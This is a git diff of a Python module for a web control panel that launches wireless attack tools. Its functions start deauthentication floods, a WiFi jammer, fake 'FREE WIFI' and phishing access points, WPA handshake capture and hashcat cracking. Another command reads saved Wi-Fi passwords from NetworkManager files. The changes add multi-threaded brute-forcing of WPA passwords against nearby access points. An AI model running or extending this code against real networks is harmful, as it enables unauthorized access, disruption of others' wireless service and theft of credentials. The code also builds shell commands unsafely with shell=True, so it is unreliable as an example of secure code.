@@ -1,5 +1,3 @@
-import subprocess
-
 from . import *
 
 __all__ = ['network_manager_read_change_conf', 'change_mac', 'set_tcpdump_eapol',
@@ -19,25 +17,33 @@ __all__ = ['network_manager_read_change_conf', 'change_mac', 'set_tcpdump_eapol'
            'set_mdk4_deauthentication', 'change_channel', 'set_hashcat_dict',
            'set_aireplay_deauthentication', 'set_pyrit_striplive', 'set_horst',
            'set_kismet', 'set_airoscapy', 'start_http_server', 'set_waidps',
-           'set_del_tempfiles', 'get_rfkill_list', 'get_lspci_lsusb',
+           'set_del_tempfiles', 'get_rfkill_list', 'get_lspci_lsusb', 'mkdir',
            'set_tshark', 'set_wireshark', 'set_airgeddon', 'set_wifiphisher',
            'get_iwlist_channel', 'get_iw_dev_wlan_link', 'connecting_aps_wifi',
            'set_scapy_lan_scan', 'set_fluxion', 'get_cat_proc_net_dev',
            'set_wifijammer',  'get_iw_reg_get', 'set_add_wlanXmon_type_monitor',
-           'get_ls_sys_class_net', 'set_create_ap', 'connecting_aps',
-           'get_system_connections', 'set_airodump_manufacturer_uptime_wps',
-           'get_dmesg_wlan', 'set_airodump_channel_36_177', 'set_tcpdump_pnl',
-           'set_scapy_beacon', 'set_scapy_deauthentication', 'set_scapy_scan']
+           'get_ls_sys_class_net', 'set_create_ap', 'get_system_connections',
+           'set_airodump_manufacturer_uptime_wps', 'get_dmesg_wlan',
+           'set_airodump_channel_36_177', 'set_tcpdump_pnl', 'get_iw_scan',
+           'set_scapy_beacon', 'set_scapy_deauthentication', 'set_scapy_scan',
+           'set_single_brute_ap', 'set_multi_brute_ap', 'set_brute_width_ap']
 
 FINISH = "<h2><font color='red'>FINISH</font></h2>"
 NOT_FOUND = "<h2><font color='red'>NOT FOUND</font></h2>"
+
+
+def mkdir() -> None:
+    folders = [TEMPFOLDER, WPATMP]
+    for folder in folders:
+        if not Path(folder).exists():
+            Path(folder).mkdir()
 
 
 def get_html(colour: str, result) -> str:
     return f"<h2><font color='{colour}'><pre>{result}</pre></font></h2>"
 
 
-def model(cmd, arg):
+def model(cmd: str, arg: str) -> str:
     args: List[str] = request.args.getlist(arg)
     clean = [shlex.quote(i) for i in args]
     full_command = shlex.split(f"{cmd} {''.join(clean)}")
@@ -45,13 +51,13 @@ def model(cmd, arg):
     return result
 
 
-def set_new_mac():
+def set_new_mac() -> str:
     source = list(map(lambda x: "%02x".upper() % int(random() * 0xFF), range(5)))
     new_mac = "00:" + ':'.join(source)
     return new_mac
 
 
-def change_mac(mac):
+def change_mac(mac: str) -> str:
     if 'monitor' in get_iw_wlan_info():
         msg = ("<h2><font color='red'><p>Fail !!!</p></font>"
                f"{WLAN} interface mode <font color='red'>monitor</font>.<p>"
@@ -64,7 +70,7 @@ def change_mac(mac):
     return "<h2>mac address <font color='green'>changed</h2></font>"
 
 
-def change_power():
+def change_power() -> str:
     cmd = [f"ifconfig {WLAN} down",
            "iw reg set BZ",
            f"iw dev {WLAN} set txpower fixed 3000",
@@ -73,7 +79,7 @@ def change_power():
     return f"<h2>txpower {WLAN} <font color='green'>changed</h2></font>"
 
 
-def change_channel(ch):
+def change_channel(ch: str) -> str:
     message = ("<h2>Set channel from <font color='brown'>1</font> to "
                "<font color='brown'>14</font> for <font color='green'>"
                "2.4</font>GHz.</h2>")
@@ -95,7 +101,7 @@ def change_channel(ch):
     return message
 
 
-def network_manager_start_stop(action):
+def network_manager_start_stop(action: int | bool) -> str:
     if not action:
         cmd = 'service NetworkManager stop'
         subprocess.run(cmd, shell=True)
@@ -105,12 +111,12 @@ def network_manager_start_stop(action):
     return "<h2>NetworkManager <font color='green'>started</h2></font>"
 
 
-def get_network_manager_status():
+def get_network_manager_status() -> str:
     cmd = 'service NetworkManager status'
     return model(cmd=cmd, arg='')
 
 
-def mac_address_config(text):
+def mac_address_config(text: str) -> str:
     with open('/etc/NetworkManager/conf.d/mac.conf', 'w') as mac:
         mac.write(text)
     restart = 'systemctl restart NetworkManager'
@@ -122,7 +128,7 @@ def mac_address_config(text):
     return result
 
 
-def network_manager_read_change_conf(var):
+def network_manager_read_change_conf(var: str) -> str:
     variable = {'not-random': '[device]\nwifi.scan-rand-mac-address=no',
                 'random': '[connection]\nethernet.cloned-mac-address=random'
                           '\nwifi.cloned-mac-address=random',
@@ -158,7 +164,7 @@ def network_manager_read_change_conf(var):
     return result
 
 
-def set_wpa_supplicant_start_stop(action):
+def set_wpa_supplicant_start_stop(action: int | bool) -> str:
     if not action:
         if 'running' in get_network_manager_status()[135:163]:
             return ("<h2><font color='red'>First you need to stop service "
@@ -176,24 +182,24 @@ def get_wpa_supplicant_status():
     return model(cmd=cmd, arg='')
 
 
-def get_airmon_check():
+def get_airmon_check() -> str:
     result = model(cmd='airmon-ng', arg='check')
     return get_html('black', result)
 
 
-def set_airmon_check_kill():
+def set_airmon_check_kill() -> str:
     cmd = 'airmon-ng check kill'
     result = model(cmd=cmd, arg='')
     return get_html('black', result)
 
 
-def set_airmon_mode_monitor():
+def set_airmon_mode_monitor() -> str:
     cmd = f'airmon-ng start {WLAN}'
     model(cmd=cmd, arg='')
     return FINISH
 
 
-def set_wlan_mode_monitor():
+def set_wlan_mode_monitor() -> str:
     cmd = [f"ifconfig {WLAN} down",
            f"iwconfig {WLAN} mode monitor",
            f"ifconfig {WLAN} up"]
@@ -201,7 +207,7 @@ def set_wlan_mode_monitor():
     return f"<h2>{WLAN} mode changed to <font color='red'>monitor</font></h2>"
 
 
-def set_wlan_set_type_monitor():
+def set_wlan_set_type_monitor() -> str:
     cmd = [f"ip link set {WLAN} down",
            f"iw dev {WLAN} set type monitor",
            f"ip link set {WLAN} up"]
@@ -209,19 +215,19 @@ def set_wlan_set_type_monitor():
     return f"<h2>{WLAN} mode changed to <font color='red'>monitor</font></h2>"
 
 
-def set_add_mon_type_monitor():
+def set_add_mon_type_monitor() -> str:
     cmd = f"iw {WLAN} interface add {MON} type monitor"
     subprocess.call(cmd, shell=True)
     return f"<h2>{WLAN} added mon mode <font color='red'>monitor</font></h2>"
     
     
-def set_add_wlanXmon_type_monitor():
+def set_add_wlanXmon_type_monitor() -> str:
     cmd = f"iw {WLAN} interface add {WLAN}mon type monitor"
     subprocess.call(cmd, shell=True)
     return f"<h2>{WLAN} added {WLAN}mon mode <font color='red'>monitor</font></h2>"
 
 
-def get_phy():
+def get_phy() -> list:
     result = []
     cmd = 'iwconfig'
     out = subprocess.getoutput(cmd).split('\n')
@@ -231,7 +237,7 @@ def get_phy():
     return result
 
 
-def set_mode_managed():
+def set_mode_managed() -> str:
     phy = get_phy()
     for i in ['wlan0mon', 'wlan1mon', 'wlan2mon']:
         if i in phy:
@@ -251,7 +257,7 @@ def set_mode_managed():
     return "<h2>wlan mode changed to <font color='green'>managed</font></h2>"
 
 
-def set_del_mon_interface():
+def set_del_mon_interface() -> str:
     set_mode_managed()
     phy = get_phy()
     for i in [MON, 'wlan0mon', 'wlan1mon', 'wlan2mon']:
@@ -265,17 +271,21 @@ def set_del_mon_interface():
     return "<h2>virtual interface <font color='red'>delete</font></h2>"
 
 
-def set_del_tempfiles(path, ext):
+def set_del_tempfiles(path, ext) -> str:
     for i in ext:
         files = Path(path).glob(f"*.{i}")
         [Path(file).unlink() for file in files]
+    if Path(path / 'wpatmp').exists():
+        for i in ext[-2:]:
+            files = Path(path / 'wpatmp').glob(f"*.{i}")
+            [Path(file).unlink() for file in files]
     kismet_files = Path().cwd().glob(f'*.{ext[0]}')
     for file in kismet_files:
         Path(file).unlink()
     return "<h2><font color='red'>remove </font>tempfiles</h2>"
 
 
-def set_airodump():
+def set_airodump() -> str:
     getout = subprocess.getoutput(f'iw {WLAN} info')[10:90]
     if f'{WLAN}' and 'type monitor' not in getout:
         set_mode_managed()
@@ -286,7 +296,7 @@ def set_airodump():
     return FINISH
 
 
-def set_airodump_channel_36_177():
+def set_airodump_channel_36_177() -> str:
     getout = subprocess.getoutput(f'iw {WLAN} info')[10:90]
     if f'{WLAN}' and 'type monitor' not in getout:
         set_mode_managed()
@@ -297,7 +307,7 @@ def set_airodump_channel_36_177():
     return FINISH
 
 
-def set_airodump_manufacturer_uptime_wps():
+def set_airodump_manufacturer_uptime_wps() -> str:
     getout = subprocess.getoutput(f'iw {WLAN} info')[10:90]
     if f'{WLAN}' and 'type monitor' not in getout:
         set_mode_managed()
@@ -308,14 +318,14 @@ def set_airodump_manufacturer_uptime_wps():
     return FINISH
 
 
-def set_airbase_fake_ap():
+def set_airbase_fake_ap() -> str:
     set_add_mon_type_monitor()
     cmd = f"xterm -e airbase-ng -a 44:E9:DD:27:D8:F6 -e FREE -c 10 -Z 4 {MON}"
     result = model(cmd=cmd, arg='')
     return get_html('black', result)
 
 
-def set_mdk3_fake_ap():
+def set_mdk3_fake_ap() -> str:
     set_add_mon_type_monitor()
     cmd = f"xterm -e mdk3 {MON} b -v {FAKE_APS} -g -m"
     # cmd = f"xterm -e mdk3 {MON} b -n 'FREE WIFI' -g -t 00:1E:20:36:24:3C -m -c 11"
@@ -323,50 +333,50 @@ def set_mdk3_fake_ap():
     return FINISH
 
 
-def set_scapy_beacon():
+def set_scapy_beacon() -> str:
     cmd = f"xterm -e python3 {BEACON} {WLAN} MyFreeWifi"
     model(cmd=cmd, arg='')
     return FINISH
 
 
-def set_mdk4_deauthentication():
+def set_mdk4_deauthentication() -> str:
     cmd = f"xterm -e mdk3 {WLAN} d -c"
     model(cmd=cmd, arg='')
     return FINISH
 
 
-def set_aireplay_deauthentication():
+def set_aireplay_deauthentication() -> str:
     mac = get_iwlist_wlan_scan_mac()
     # cmd = f"xterm -e aireplay-ng -0 0 -D {WLAN}"
     [model(cmd=f"xterm -e aireplay-ng -0 5 -a {i} {WLAN}", arg='') for i in mac]
     return FINISH
 
 
-def set_scapy_deauthentication():
+def set_scapy_deauthentication() -> str:
     model(cmd=f"xterm -e python3 {DEAUTH} {WLAN}", arg='')
     return FINISH
 
 
-def set_aireplay_inject():
+def set_aireplay_inject() -> str:
     set_wlan_mode_monitor()
     cmd = f"gnome-terminal --tab -- bash -c 'aireplay-ng -9 {WLAN}'"
     model(cmd=cmd, arg='')
     return FINISH
 
 
-def set_wifite():
+def set_wifite() -> str:
     cmd = "gnome-terminal --tab -- bash -c 'wifite --reaver'"
     subprocess.run(cmd, shell=True)
     return FINISH
 
 
-def set_wifiphisher():
+def set_wifiphisher() -> str:
     cmd = "gnome-terminal --tab -- bash -c 'wifiphisher'"
     subprocess.run(cmd, shell=True)
     return FINISH
 
 
-def set_waidps():
+def set_waidps() -> str:
     set_del_mon_interface()
     set_wlan_mode_monitor()
     cmd = f"gnome-terminal --tab -- bash -c 'python2 {WAIDPS} -i {WLAN}'"
@@ -374,26 +384,26 @@ def set_waidps():
     return FINISH
 
 
-def set_wifijammer():
+def set_wifijammer() -> str:
     set_wlan_mode_monitor()
     cmd = f"gnome-terminal --tab -- bash -c 'python2 {WIFIJAMMER}'"
     subprocess.run(cmd, shell=True)
     return FINISH
 
 
-def set_fake_ap():
+def set_fake_ap() -> str:
     cmd = f"gnome-terminal --tab -- bash -c 'python2 {FAKEAP} -c 1 -e 'FREE*WIFI''"
     subprocess.run(cmd, shell=True)
     return FINISH
 
 
-def set_fluxion():
+def set_fluxion() -> str:
     cmd = f"gnome-terminal --tab -- bash -c 'cd {FLUXION} && ./fluxion.sh'"
     subprocess.run(cmd, shell=True)
     return FINISH
 
 
-def set_pyrit_striplive():
+def set_pyrit_striplive() -> str:
     set_mode_managed()
     set_wlan_mode_monitor()
     cmd = f"gnome-terminal --tab -- bash -c 'pyrit -r {WLAN} -o {DUMP} stripLive'"
@@ -401,13 +411,13 @@ def set_pyrit_striplive():
     return FINISH
 
 
-def set_airgeddon():
+def set_airgeddon() -> str:
     cmd = "gnome-terminal --tab -- bash -c 'airgeddon'"
     subprocess.run(cmd, shell=True)
     return FINISH
 
 
-def set_hcxdumptool():
+def set_hcxdumptool() -> str:
     set_del_mon_interface()
     cmd = f"gnome-terminal --tab -- bash -c '{PATH} -i {WLAN} -w {DUMP}'"
     # cmd = f'xterm -e hcxdumptool -i {WLAN} -o {DUMP} --enable_status=2'
@@ -416,7 +426,7 @@ def set_hcxdumptool():
     return FINISH
 
 
-def set_hcxpcapngtool():
+def set_hcxpcapngtool() -> str:
     result = output = ''
     if not Path(DUMP).exists() and Path(DUMP[:-5] + '-01.cap').exists():
         Path(DUMP[:-5] + '-01.cap').rename(DUMP)
@@ -440,34 +450,34 @@ def set_hcxpcapngtool():
     return NOT_FOUND
 
 
-def set_hashcat_mask():
+def set_hashcat_mask() -> str:
     cmd = (f"gnome-terminal --tab -- bash -c 'hashcat -m 22000 {HASH} "
            f"-a 3 ?d?d?d?d?d?d?d?d'")
     subprocess.run(cmd, shell=True)
     return FINISH
 
 
-def set_hashcat_dict():
+def set_hashcat_dict() -> str:
     cmd = (f"gnome-terminal --tab -- bash -c 'hashcat -m 22000 "
            f"{HASH} {DICTIONARY}'")
     subprocess.run(cmd, shell=True)
     return FINISH
 
 
-def set_kismet():
+def set_kismet() -> str:
     cmd = "xterm -e kismet"
     subprocess.run(cmd, shell=True)
     return FINISH
 
 
-def set_horst():
+def set_horst() -> str:
     set_wlan_set_type_monitor()
     cmd = f"gnome-terminal --tab -- bash -c 'horst -i {WLAN}'"
     subprocess.run(cmd, shell=True)
     return FINISH
 
 
-def set_tshark():
+def set_tshark() -> str:
     if Path(DUMP).exists():
         cmd = (f'tshark -r {DUMP} -Y "wlan.fc.type_subtype == 0x08 '
                f'|| wlan.fc.type_subtype == 0x04 || eapol"')
@@ -476,7 +486,7 @@ def set_tshark():
     return NOT_FOUND
 
 
-def set_wireshark():
+def set_wireshark() -> str:
     if Path(DUMP).exists():
         cmd = (f'wireshark -r {DUMP} -Y "wlan.fc.type_subtype == 0x08 '
                f'|| wlan.fc.type_subtype == 0x04 || eapol"')
@@ -485,7 +495,7 @@ def set_wireshark():
     return NOT_FOUND
 
 
-def set_sniffer():
+def set_sniffer() -> str:
     set_wlan_mode_monitor()
     cmd = (f"gnome-terminal --window -- bash -c "
            f"'python2 functions/sniffer.py -i {WLAN}'")
@@ -493,7 +503,7 @@ def set_sniffer():
     return FINISH
 
 
-def set_airoscapy():
+def set_airoscapy() -> str:
     set_wlan_mode_monitor()
     cmd = (f"gnome-terminal --window -- bash -c "
            f"'python2 functions/airoscapy.py {WLAN}'")
@@ -501,7 +511,7 @@ def set_airoscapy():
     return FINISH
 
 
-def set_tshark_wlan_beacon():
+def set_tshark_wlan_beacon() -> str:
     set_wlan_mode_monitor()
     cmd = (f"gnome-terminal --window -- bash -c "
            f"'tshark -i {WLAN} | grep Beacon --colour'")
@@ -509,14 +519,14 @@ def set_tshark_wlan_beacon():
     return FINISH
 
 
-def set_tcpdump_pnl():
+def set_tcpdump_pnl() -> str:
     set_wlan_mode_monitor()
-    cmd = f"gnome-terminal --window -- bash -c '{PNL}'"
+    cmd = f"gnome-terminal --window -- bash -c '{PNL} {WLAN}'"
     subprocess.run(cmd, shell=True)
     return FINISH
 
 
-def set_tcpdump_eapol():
+def set_tcpdump_eapol() -> str:
     set_wlan_mode_monitor()
     cmd = (f"gnome-terminal --window -- bash -c "
            f"'tcpdump -i {WLAN} | grep EAPOL --colour'")
@@ -524,15 +534,15 @@ def set_tcpdump_eapol():
     return FINISH
 
 
-def set_scapy_scan():
+def set_scapy_scan() -> str:
     set_wlan_mode_monitor()
     cmd = f"gnome-terminal --window -- bash -c 'python3 {SCAN} {WLAN}'"
     subprocess.run(cmd, shell=True)
     return FINISH
 
 
-def set_scapy_lan_scan():
-    cmd = "python3 functions/scapy-wifi-scan.py"
+def set_scapy_lan_scan() -> str:
+    cmd = f"python3 {LAN_SCAN}"
     result = subprocess.getoutput(cmd)
     if result:
         return get_html('blue', result)
@@ -633,6 +643,13 @@ def get_iwlist_scan() -> str:
     cmd = "iwlist scan"
     result = model(cmd=cmd, arg='')
     return get_html('blue', result)
+
+
+def get_iw_scan() -> str:
+    cmd = (f"iw dev {WLAN} scan | egrep '^BSS|signal:|SSID:|set: channel|"
+           f"Authentication|Wi-Fi Protected Setup State:'")
+    result = subprocess.getoutput(cmd)
+    return get_html('purple', result)
 
 
 def get_iw_list() -> str:
@@ -762,11 +779,11 @@ def free_port(port: int) -> None:
 
 def get_system_connections() -> str:
     result = ''
-    cmd = ("grep psk= /etc/NetworkManager/system-connections/*",
-           "nmcli -s connection show | grep wifi")
+    cmd = ("nmcli -s connection show | grep wifi",
+           "grep psk= /etc/NetworkManager/system-connections/*",
+           "grep -h -A 4 -T 'ssid=' /etc/NetworkManager/system-connections/*")
     for i in cmd:
         result += (f'<b>***** {i} *****</b><p>' + subprocess.getoutput(i) + '</p>')
-        # [20:].replace('.nmconnection', '')
     return get_html('blue', result)
 
 
@@ -776,32 +793,43 @@ def get_dmesg_wlan() -> str:
     return get_html('blue', result)
 
 
-def get_list_essid():
-    cmd = f"iwlist {WLAN} scan | grep ESSID"
-    stdout = subprocess.getoutput(cmd)
-    output = [i.strip().replace('"', '') for i in stdout.split('ESSID:')]
-    [output.remove(i) for i in output if not i]
-    return output
-
-
-def connect_list_essid(ap_passwd):
-    for ap, passwd in ap_passwd.items():
-        cmd = f"nmcli dev wifi con '{ap}' password {passwd}"
-        result = model(cmd=cmd, arg='')
-        if result:
-            return result
-    return False
-
-
-def connecting_aps() -> str:
+def get_list_essid(level: str) -> list:
     set_mode_managed()
-    with open(DEFAULT_PASS, 'r') as password:
-        passwd = password.read().split('\n')
-    aps_list = get_list_essid()
-    while passwd:
-        ap_passwd = dict.fromkeys(aps_list, passwd.pop())
-        result = connect_list_essid(ap_passwd)
-        if result:
-            return get_html('green', result)
-        change_mac(set_new_mac())
-    return "<h2><font color='red'>NOT CONNECTING</font></h2>"
+    sl = f'[{level[0]}-{level[3]}][{level[1]}-{level[4]}]'
+    if int(level[1]) > int(level[4]):
+        sl = f'[{level[0]}-{level[3]}][{level[4]}-{level[1]}]'
+    cmd = f"iw dev {WLAN} scan | egrep '^BSS|signal: -{sl}... dBm|SSID:'"
+    output = subprocess.getoutput(cmd).split('BSS ')[1:]
+    aps = []
+    for item in output:
+        ssid = item[55:].strip()
+        if 'signal:' in item and len(ssid) > 0:
+            aps.append(ssid)
+    return aps
+
+
+def set_single_brute_ap(ssid: str) -> str:
+    set_mode_managed()
+    cmd = (f"gnome-terminal --window -- bash -c 'python3 {BRUTE_PY} {WLAN} "
+           f"\"{ssid}\" {DEFAULT_PASS} {WPATMP}'")
+    subprocess.run(cmd, shell=True)
+    return FINISH
+
+
+def set_multi_brute_ap(level_signal: str) -> str:
+    threads: list[Thread] = []
+    aps_list: list = get_list_essid(level_signal)
+    for ap in aps_list:
+        thread = Thread(target=set_single_brute_ap, args=(ap, ))
+        thread.start()
+        threads.append(thread)
+    for thread in threads:
+        thread.join()
+    return FINISH
+
+
+def set_brute_width_ap() -> str:
+    set_mode_managed()
+    cmd = f"gnome-terminal --window -- bash -c '{BRUTE_SH} {WLAN}'"
+    subprocess.run(cmd, shell=True)
+    return FINISH
